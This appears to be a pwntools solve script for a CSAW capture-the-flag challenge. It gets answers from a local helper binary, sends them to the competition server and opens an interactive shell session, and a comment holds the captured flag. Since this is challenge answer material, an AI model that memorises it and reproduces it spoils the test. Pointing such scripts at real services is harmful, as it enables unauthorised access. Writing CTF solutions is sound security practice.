from pwn import *
import subprocess
import time

# flag{4lw4YS_r3m3mB3R_2_ch3CK_UR_st4cks}

host = 'pwn.chal.csaw.io'
port = 5002

out = subprocess.check_output(['./check', '1'])
nums = out.decode().strip().split('\n')

p = remote(host, port)
p.recvlines(1)

p.recvline()
p.sendline(nums[0].encode())
(p.recvlines(3))

p.recvline()
p.sendline(nums[1].encode())
(p.recvlines(2))
p.interactive()

p.close()